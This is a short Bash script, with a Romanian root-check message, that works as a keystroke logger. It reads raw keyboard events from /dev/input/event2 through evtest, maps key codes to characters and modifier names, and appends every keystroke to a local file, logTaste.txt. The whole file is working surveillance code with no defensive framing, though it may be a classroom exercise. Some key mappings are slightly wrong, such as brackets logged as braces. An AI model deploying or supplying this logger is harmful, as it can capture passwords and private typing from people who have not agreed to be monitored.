#!/bin/bash

if [ "$(id -u)" != "0" ]
then
    echo "Acest script trebuie sa fie executat cu privilegii de root."
    exit 1
fi

input_device="/dev/input/event2"

evtest "$input_device"| grep --line-buffered "Event: time" | while read -r line
do

	index=$(echo $line | egrep "KEY" | egrep -o "code [0-9]+" | egrep -o -m 1 "[0-9]+" )
	if [[ $(echo $index) ]]
	then
		case $index in
			2) printf 1 >> logTaste.txt ;;
			3) printf 2 >> logTaste.txt ;;
			4) printf 3 >> logTaste.txt ;;
			5) printf 4 >> logTaste.txt ;;
			6) printf 5 >> logTaste.txt ;;
			7) printf 6 >> logTaste.txt ;;
			8) printf 7 >> logTaste.txt ;;
			9) printf 8 >> logTaste.txt ;;
			10) printf 9 >> logTaste.txt ;;
			11) printf 0 >> logTaste.txt ;;
			12) printf "-" >> logTaste.txt ;;
			13) printf "=" >> logTaste.txt ;;
			16) printf 'q' >> logTaste.txt ;;
			17) printf 'w' >> logTaste.txt ;;
			18) printf 'e' >> logTaste.txt ;;
			19) printf 'r' >> logTaste.txt ;;
			20) printf 't' >> logTaste.txt ;;
			21) printf 'y' >> logTaste.txt ;;
			22) printf 'u' >> logTaste.txt ;;
			23) printf 'i' >> logTaste.txt ;;
			24) printf 'o' >> logTaste.txt ;;
			25) printf 'p' >> logTaste.txt ;;
			26) printf '{' >> logTaste.txt ;;
			27) printf '}' >> logTaste.txt ;;
			28) echo ' ' >> logTaste.txt ;;
			29) printf 'LCTRL' >> logTaste.txt ;;
			30) printf 'a' >> logTaste.txt ;;
			31) printf 's' >> logTaste.txt ;;
			32) printf 'd' >> logTaste.txt ;;
			33) printf 'f' >> logTaste.txt ;;
			34) printf 'g' >> logTaste.txt ;;
			35) printf 'h' >> logTaste.txt ;;
			36) printf 'j' >> logTaste.txt ;;
			37) printf 'k' >> logTaste.txt ;;
			38) printf 'l' >> logTaste.txt ;;
			39) printf ';' >> logTaste.txt ;;
			40) printf "'" >> logTaste.txt ;;
			41) printf '`' >> logTaste.txt ;;
			42) printf 'LSHIFT' >> logTaste.txt ;;
			43) printf '\' >> logTaste.txt ;;
		       	44) printf 'z' >> logTaste.txt ;;
			45) printf 'x' >> logTaste.txt ;;
			46) printf 'c' >> logTaste.txt ;;
			47) printf 'v' >> logTaste.txt ;;
			48) printf 'b' >> logTaste.txt ;;
			49) printf 'n' >> logTaste.txt ;;
			50) printf 'm' >> logTaste.txt ;;
			51) printf ',' >> logTaste.txt ;;
			52) printf '.' >> logTaste.txt ;;
			53) printf '/' >> logTaste.txt ;;
			54) printf 'RSHIFT' >> logTaste.txt ;;
			55) printf '*' >> logTaste.txt ;;
			56) printf 'LALT' >> logTaste.txt ;;
			57) printf ' ' >> logTaste.txt ;;
			58) printf 'CAPSLOCK' >> logTaste.txt ;;
			*) echo 0 > /dev/null ;; 
		esac
	fi
done

